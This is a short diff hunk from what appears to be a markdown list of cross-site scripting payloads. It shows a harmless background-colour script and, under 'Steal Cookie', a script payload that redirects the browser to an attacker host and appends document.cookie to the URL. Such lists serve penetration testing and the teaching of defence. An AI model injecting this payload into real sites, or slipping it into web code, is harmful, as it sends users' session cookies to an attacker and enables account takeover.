@@ -25,6 +25,7 @@
 <!--change background color-->
 <script>document.body.style.backgroundColor = "red"</script>
 ```
+
 ## Steal Cookie
 ```html
 <script>window.location='http://attacker/?cookie='+document.cookie</script>
